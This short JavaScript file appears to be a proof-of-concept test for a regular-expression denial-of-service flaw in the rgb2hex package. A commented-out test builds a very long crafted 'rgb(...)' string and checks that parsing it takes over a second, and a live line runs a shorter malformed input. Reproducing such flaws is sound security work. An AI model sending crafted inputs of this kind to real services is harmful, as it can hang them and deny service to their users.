// test("ReDos in rgb2hex", () => {
//     const genstr = require("./utils").genstr;
//     const measureTime = require("./utils").measureTime;
//     const rgb2hex = require('rgb2hex');
  
//     //const color = 'rgb(0,0,0,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000)';
//     const color = 'rgb(' +  genstr(10000,"121.21,") + '000)';
  
//     let t = measureTime(function () {
//         rgb2hex(color)    
//     });
  
//     let time = t[0] + t[1] / 1000000000;
  
//     expect(time).toBeGreaterThan(1);
//   });

var rgb2hex = require('rgb2hex');
const color = 'rgb(0,0,0,0000,0000,0000,0000,0000,0000';
console.log(rgb2hex(color));